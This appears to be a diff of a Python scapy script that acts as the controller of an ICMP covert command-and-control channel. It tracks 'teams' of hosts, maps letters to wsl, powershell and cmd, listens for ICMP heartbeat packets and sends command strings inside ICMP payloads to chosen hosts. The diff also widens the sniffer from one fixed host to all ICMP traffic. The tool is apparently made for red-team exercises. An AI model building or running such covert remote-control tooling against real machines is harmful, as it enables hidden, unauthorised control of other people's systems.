@@ -1,5 +1,7 @@
-from scapy.all import *
 import csv
+import threading
+from scapy.all import *
+
 teams = []
 cmdproc = [["l", "wsl"], ["p", "powershell"], ["c", "cmd"]]
 def setup():
@@ -18,7 +20,7 @@ def setup():
     #Fork Point is here.
 
 def sniffer():
-    pkts = sc.sniff(filter="icmp and host 66.35.250.151")
+    pkts = sc.sniff(filter="icmp")
     #These packets will come in periodically. The heartbeat will just have 1pkt that will have the str hb
 
 def main():
@@ -45,6 +47,7 @@ def main():
             print(send)
             msg = ''.join(send)
             print(msg)
+            ack = False
             print(teams[int(target[0])-1][int(target[1])-1][1])
             rpckt = sr1(IP(dst=teams[int(target[0])-1][int(target[1])-1][1])/ICMP()/msg)
             print(rpckt.show())
